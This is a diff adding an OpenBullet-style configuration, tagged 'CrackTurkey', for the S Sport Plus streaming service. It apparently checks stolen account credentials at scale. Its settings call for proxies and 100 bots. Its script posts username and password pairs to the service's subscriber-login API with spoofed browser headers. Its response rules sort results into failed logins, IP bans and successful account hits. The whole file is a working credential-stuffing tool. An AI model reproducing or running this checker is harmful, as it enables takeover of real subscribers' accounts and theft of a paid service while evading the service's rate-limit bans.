@@ -1,0 +1,89 @@
+[SETTINGS]
+{
+  "Name": "S-Sport Global",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-22T13:03:28.6724798+03:00",
+  "AdditionalInfo": "",
+  "Author": " e a m",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "",
+      "VariableName": "",
+      "Id": 1836112780
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#CrackTurkey REQUEST POST "https://api.ssportplus.com/MW/SubscriberLogin" 
+  CONTENT "{\"action\":\"SubscriberLogin\",\"subscriber\":{\"LoginPreferedMethod\":4,\"UILanguage\":\"tr\",\"Email\":\"<USER>\",\"PIN\":\"<PASS>\"},\"Devices\":[{\"PlatformID\":\"10\"}]}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.ssportplus.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 172" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "UILanguage: tr" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 OPR/73.0.3856.431" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Origin: https://app.ssportplus.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://app.ssportplus.com/login" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+#CrackTurkey KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "E-Posta adresinizi ve / veya Şifrenizi hatalı girdiniz. Bilgilerinizi kontrol ederek, tekrar giriş yapmayı deneyebilirsiniz" 
+    KEY "Sunucuya Erişim Sağlanamıyor. Internet bağlantınızı kontrol ederek tekrar deneyin" 
+  KEYCHAIN Ban OR 
+    KEY "E-posta adresinizi  çok sayıda hatalı girdiğiniz için ip adresiniz bloke edildi" 
+    KEY "Eposta adresinizi ve /veya şifrenizi çok sayıda hatalı giriş yaptığınız için ip adresiniz karantinaya alındı" 
+  KEYCHAIN Success OR 
+    KEY "Bulunduğunuz Bölgeden Hizmet Verilememektedir" 
+  KEYCHAIN Success AND 
+    KEY "SessionID" 
+    KEY "PackageName" 
+
